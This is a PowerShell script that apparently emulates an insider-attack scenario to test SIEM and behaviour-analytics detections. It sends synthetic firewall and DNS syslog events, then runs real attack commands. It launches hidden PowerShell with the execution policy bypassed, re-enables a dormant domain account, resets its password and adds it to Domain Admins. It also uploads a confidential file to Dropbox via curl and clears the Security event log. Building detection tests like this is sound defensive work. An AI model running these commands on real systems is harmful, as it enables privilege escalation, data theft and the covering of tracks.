#Elevate to run as administrator reference https://ss64.com/ps/syntax-elevate.html
#Start-Process powershell -ArgumentList '-noprofile -file C:\s3-downloads\UseCases_Scripts\UseCase_1\Files\Attack_01.ps1' -verb RunAs
#BASIC SCRIPT FRAMEWORK FOR SCENARIO 1.
param (
    [string]$Coll_IP,
    [string]$Instance_IP1,
    [string]$User_Account,
    [string]$ZoneName,
    [string]$DomainName,
    [string]$DomainNetbiosName,
    [string]$ServerName,
    [string]$PhishingName
    )
$User_Account2 = "$User_Account-2"
# Create a UDP Client Object
$UDPCLient = New-Object System.Net.Sockets.UdpClient
#Type of encoding that will be used for the syslog
$Encoding = [System.Text.Encoding]::ASCII

echo "Starting..."
Sleep 2

#Step 0 - Generate underlying events
    #DNS and Firewall logs
    #Visited site 1
    #Firewall log
    $Timestamp = Get-Date -Format "MMM dd HH:mm:ss"
    $Timestamp2 = Get-Date -Format "yyyy/MM/dd HH:mm:ss"
    $UnixTimestamp = [int][double]::Parse((Get-Date).ToUniversalTime().Subtract((Get-Date "1970-01-01")).TotalSeconds)
    # Assemble the full syslog formatted message
    $IP="173.193.251.45"
    $Port="80"
    $FullSyslogMessage = "T$UnixTimestamp <14>$Timestamp ${DomainNetbiosName}_PA 1,$Timestamp2,000000000707,TRAFFIC,end,7,$Timestamp2,$Instance_IP1,$IP,0.0.0.0,0.0.0.0,Default_OUTBOUND,$User_Account,,web-browsing,vsys2,Internal,External,ethernet1/1.807,ethernet1/2.909,default,$Timestamp2,134045,1,10951,$Port,0,0,0x1c,tcp,allow,1158,646,512,10,$Timestamp2,15,any,1,8470167894323,0x0,England,United States,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, "
    # Convert into byte array representation
    $ByteSyslogMessage = $Encoding.GetBytes($FullSyslogMessage)
    #Define the UDP port and connect
    $UDPCLient.Connect($Coll_IP, 20003)
    #Send the message
    $UDPCLient.Send($ByteSyslogMessage, $ByteSyslogMessage.Length)
    Sleep 2
#Firewall proxy log
    $Timestamp = Get-Date -Format "MMM dd HH:mm:ss"
    $Timestamp2 = Get-Date -Format "yyyy/MM/dd HH:mm:ss"
    $UnixTimestamp = [int][double]::Parse((Get-Date).ToUniversalTime().Subtract((Get-Date "1970-01-01")).TotalSeconds)
    # Assemble the full syslog formatted message
    $IP="173.193.251.45"
    $Port="80"
    $URL="www.casino.net"
    $FullSyslogMessage = "T$UnixTimestamp <14>$Timestamp ${DomainNetbiosName}_PA 1,$Timestamp2,000000000707,THREAT,url,7,$Timestamp2,$Instance_IP1,$IP,$IP,$IP,DynamicDefault,$User_Account,,web-browsing,vsys1,Trust,Untrust,ethernet1/2,ethernet1/1,default,$Timestamp2,976,1,1126,$Port,38931,80,0x40,tcp,block-url,$URL,-9999,blocked-sites,informational,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, "
    # Convert into byte array representation
    $ByteSyslogMessage = $Encoding.GetBytes($FullSyslogMessage)
    #Define the UDP port and connect
    $UDPCLient.Connect($Coll_IP, 20003)
    #Send the message
    $UDPCLient.Send($ByteSyslogMessage, $ByteSyslogMessage.Length)

#DNS log
    #Define the message    
    $URL="www.casino.net"
    $DNSDomain = "casino.net"
    $Message = "CEF:0|Infoblox|NIOS|8.2.7-372540|000-00000|DNS Query|1|src=$Instance_IP1 spt=53685 dhost=$URL destinationDnsDomain=$DNSDomain dvc=0.0.0.0"
    #Name of the sender
    $Hostname= "${DomainNetbiosName}_DNS"
    #Time format syslog understands
    $Timestamp = Get-Date -Format "MMM dd yyyy HH:mm:ss"
    # Assemble the full syslog formatted message
    $FullSyslogMessage = "{0} {1} 0.0.0.0 {2}" -f $Hostname, $Timestamp, $Message
    # Convert into byte array representation
    $ByteSyslogMessage = $Encoding.GetBytes($FullSyslogMessage)
    #Define the UDP port and connect
    $UDPCLient.Connect($Coll_IP, 20000)
    #Send the message
    $UDPCLient.Send($ByteSyslogMessage, $ByteSyslogMessage.Length)
    Sleep 50

    #Visited site 2
#Firewall log
    #DNS and Firewall logs
    #Visited site 1
    #Firewall log
    $Timestamp = Get-Date -Format "MMM dd HH:mm:ss"
    $Timestamp2 = Get-Date -Format "yyyy/MM/dd HH:mm:ss"
    $UnixTimestamp = [int][double]::Parse((Get-Date).ToUniversalTime().Subtract((Get-Date "1970-01-01")).TotalSeconds)
    # Assemble the full syslog formatted message
    $IP="104.18.14.134"
    $Port="80"
    $FullSyslogMessage = "T$UnixTimestamp <14>$Timestamp ${DomainNetbiosName}_PA 1,$Timestamp2,000000000707,TRAFFIC,end,7,$Timestamp2,$Instance_IP1,$IP,0.0.0.0,0.0.0.0,Default_OUTBOUND,$User_Account,,web-browsing,vsys2,Internal,External,ethernet1/1.807,ethernet1/2.909,default,$Timestamp2,134045,1,10951,$Port,0,0,0x1c,tcp,allow,1158,646,512,10,$Timestamp2,15,any,1,8470167894323,0x0,England,United States,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, "
    # Convert into byte array representation
    $ByteSyslogMessage = $Encoding.GetBytes($FullSyslogMessage)
    #Define the UDP port and connect
    $UDPCLient.Connect($Coll_IP, 20003)
    #Send the message
    $UDPCLient.Send($ByteSyslogMessage, $ByteSyslogMessage.Length)
    Sleep 2
#Firewall proxy log
    $Timestamp = Get-Date -Format "MMM dd HH:mm:ss"
    $Timestamp2 = Get-Date -Format "yyyy/MM/dd HH:mm:ss"
    $UnixTimestamp = [int][double]::Parse((Get-Date).ToUniversalTime().Subtract((Get-Date "1970-01-01")).TotalSeconds)
    # Assemble the full syslog formatted message
    $IP="104.18.14.134"
    $Port="80"
    $URL="www.gamblingsites.com"
    $FullSyslogMessage = "T$UnixTimestamp <14>$Timestamp ${DomainNetbiosName}_PA 1,$Timestamp2,000000000707,THREAT,url,7,$Timestamp2,$Instance_IP1,$IP,$IP,$IP,DynamicDefault,$User_Account,,web-browsing,vsys1,Trust,Untrust,ethernet1/2,ethernet1/1,default,$Timestamp2,976,1,1126,$Port,38931,80,0x40,tcp,block-url,$URL,-9999,blocked-sites,informational,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, "
    # Convert into byte array representation
    $ByteSyslogMessage = $Encoding.GetBytes($FullSyslogMessage)
    #Define the UDP port and connect
    $UDPCLient.Connect($Coll_IP, 20003)
    #Send the message
    $UDPCLient.Send($ByteSyslogMessage, $ByteSyslogMessage.Length)

#DNS log
    #Define the message    
    $URL="www.gamblingsites.com"
    $DNSDomain = "gamblingsites.com"
    $Message = "CEF:0|Infoblox|NIOS|8.2.7-372540|000-00000|DNS Query|1|src=$Instance_IP1 spt=53685 dhost=$URL destinationDnsDomain=$DNSDomain dvc=0.0.0.0"
    #Name of the sender
    $Hostname= "${DomainNetbiosName}_DNS"
    $Timestamp = Get-Date -Format "MMM dd yyyy HH:mm:ss"
    # Assemble the full syslog formatted message
    $FullSyslogMessage = "{0} {1} 0.0.0.0 {2}" -f $Hostname, $Timestamp, $Message
    # Convert into byte array representation
    $ByteSyslogMessage = $Encoding.GetBytes($FullSyslogMessage)
    #Define the UDP port and connect
    $UDPCLient.Connect($Coll_IP, 20000)
    #Send the message
    $UDPCLient.Send($ByteSyslogMessage, $ByteSyslogMessage.Length)
    Sleep 50

    #Visited site 3
#Firewall log
    $Timestamp = Get-Date -Format "MMM dd HH:mm:ss"
    $Timestamp2 = Get-Date -Format "yyyy/MM/dd HH:mm:ss"
    $UnixTimestamp = [int][double]::Parse((Get-Date).ToUniversalTime().Subtract((Get-Date "1970-01-01")).TotalSeconds)
    # Assemble the full syslog formatted message
    $IP="157.185.164.160"
    $Port="80"
    $FullSyslogMessage = "T$UnixTimestamp <14>$Timestamp ${DomainNetbiosName}_PA 1,$Timestamp2,000000000707,TRAFFIC,end,7,$Timestamp2,$Instance_IP1,$IP,0.0.0.0,0.0.0.0,Default_OUTBOUND,$User_Account,,web-browsing,vsys2,Internal,External,ethernet1/1.807,ethernet1/2.909,default,$Timestamp2,134045,1,10951,$Port,0,0,0x1c,tcp,allow,1158,646,512,10,$Timestamp2,15,any,1,8470167894323,0x0,England,United States,1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, "
    # Convert into byte array representation
    $ByteSyslogMessage = $Encoding.GetBytes($FullSyslogMessage)
    #Define the UDP port and connect
    $UDPCLient.Connect($Coll_IP, 20003)
    #Send the message
    $UDPCLient.Send($ByteSyslogMessage, $ByteSyslogMessage.Length)
    Sleep 2
#Firewall proxy log
    $Timestamp = Get-Date -Format "MMM dd HH:mm:ss"
    $Timestamp2 = Get-Date -Format "yyyy/MM/dd HH:mm:ss"
    $UnixTimestamp = [int][double]::Parse((Get-Date).ToUniversalTime().Subtract((Get-Date "1970-01-01")).TotalSeconds)
    # Assemble the full syslog formatted message
    $IP="157.185.164.160"
    $Port="80"
    $URL="www.bovada.lv"
    $FullSyslogMessage = "T$UnixTimestamp <14>$Timestamp ${DomainNetbiosName}_PA 1,$Timestamp2,000000000707,THREAT,url,7,$Timestamp2,$Instance_IP1,$IP,$IP,$IP,DynamicDefault,$User_Account,,web-browsing,vsys1,Trust,Untrust,ethernet1/2,ethernet1/1,default,$Timestamp2,976,1,1126,$Port,38931,80,0x40,tcp,block-url,$URL,-9999,blocked-sites,informational,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, "

    # Convert into byte array representation
    $ByteSyslogMessage = $Encoding.GetBytes($FullSyslogMessage)
    #Define the UDP port and connect
    $UDPCLient.Connect($Coll_IP, 20003)
    #Send the message
    $UDPCLient.Send($ByteSyslogMessage, $ByteSyslogMessage.Length)

#DNS log
    #Define the message    
    $URL="www.bovada.lv"
    $DNSDomain = "bovada.lv"
    $Message = "CEF:0|Infoblox|NIOS|8.2.7-372540|000-00000|DNS Query|1|src=$Instance_IP1 spt=53685 dhost=$URL destinationDnsDomain=$DNSDomain dvc=0.0.0.0"
    #Name of the sender
    $Hostname= "${DomainNetbiosName}_DNS"
    $Timestamp = Get-Date -Format "MMM dd yyyy HH:mm:ss"
    # Assemble the full syslog formatted message
    $FullSyslogMessage = "{0} {1} 0.0.0.0 {2}" -f $Hostname, $Timestamp, $Message
    # Convert into byte array representation
    $ByteSyslogMessage = $Encoding.GetBytes($FullSyslogMessage)
    #Define the UDP port and connect
    $UDPCLient.Connect($Coll_IP, 20000)
    #Send the message
    $UDPCLient.Send($ByteSyslogMessage, $ByteSyslogMessage.Length)
    Sleep 100

    #FIM event
    New-Item -Path "C:\Users\Public\Documents\badthing.ps1" -ItemType File
    Set-Content -Path "C:\Users\Public\Documents\badthing.ps1" -Value (Get-Date)
    Sleep 50


#Step 1 | [ABA] Malicious Document - Word Spawns Executable From Users Directory

    ######################################################
    # For this to execute properly (and consistently),   #
    # the .ps1 that it's calling should exist. It's an   #
    # Empty file so nothing happens.                     #
    ######################################################
    cmd /c 'powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -file C:\Users\Public\Documents\badthing.ps1' #2>&1 | Out-Null#
    #$PSExecute = "powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -file C:\Users\Public\Documents\badthing.ps1;"
    echo "Executing malicious powershell..."
    Sleep 120

#Step 2 | [UBA] Account Enabled - Finding dormant account to leverage
    cmd /c "net user $User_Account2 /active:yes /domain"
    echo "Enabling Dormant User..." 
    Sleep 30

#Step 3 | [Notable] Account Password Reset Event
    cmd /c "net user $User_Account2 !23Asdfg! /domain"
    echo "Resetting Account Password..."
    Sleep 30

#Step 4 | [Notable] Password Set To Never Expire
    
    ######################################################
    # Note for Step 4, I had to turn on the Max Password #
    # age for all accounts and set it to 999 days. From  #
    # here, you have to manually set the pw expiration   #
    # for each account. To check this, run "net accounts #
    # /domain." This can be changed to unlimited by run- #
    # ning "net accounts /MaxPWAge:unlimited /domain"    #
    # Reference https://srisunthorn.wordpress.com        #
    # /2019/03/07/set-password-to-never-expire-for-domain#
    #-accounts-in-windows-server/                        #                 
    ######################################################    

#Step 5 | [UBA] Account Privilege Escalated
    cmd /c "net group 'domain admins' /add $User_Account2 /domain"
    echo "Elevating privileges for Compromised Account..."
    Sleep 200

#Step 6 | [ABA] Exfil - DropBox
    cmd /c 'curl.exe -X POST https://content.dropboxapi.com/2/files/upload --header "Authorization: Bearer [API TOKEN]" --header "Content-Type: text/plain; charset=dropbox-cors-hack" --data-binary @C:\Users\Administrator\Desktop\[confidential_file].txt --header "Dropbox-API-Arg: {\"path\": \"/Apps/[confidential_file].txt\"}"' 2>&1 | Out-Null;
    echo "Exfiltrating confidential data to Cloud Account..."
    Sleep 60

    ######################################################
    # Before step 6, we just need to allow enough time   # 
    # for WMI to be polled which I think is every 2 min  #
    # otherwise the account enabled and password change  #
    # events will not be collected in time, resulting in #
    # missing alerts and events.                         # 
    ######################################################

#Step 7 | [UBA] Detection Evasion - Event Log Deletion
    Wevtutil clear-log security
    echo "Deleting audit trail to cover tracks..."
    Sleep 5

#Clean up activity | Disable Dormant Valid Account and remove Elevated Privileges
   cmd /c "net user $User_Account2 /active:no /domain"
   
   cmd /c "net group 'domain admins' /delete $User_Account2 /domain"
   echo "Mission Accomplished"
   Sleep 5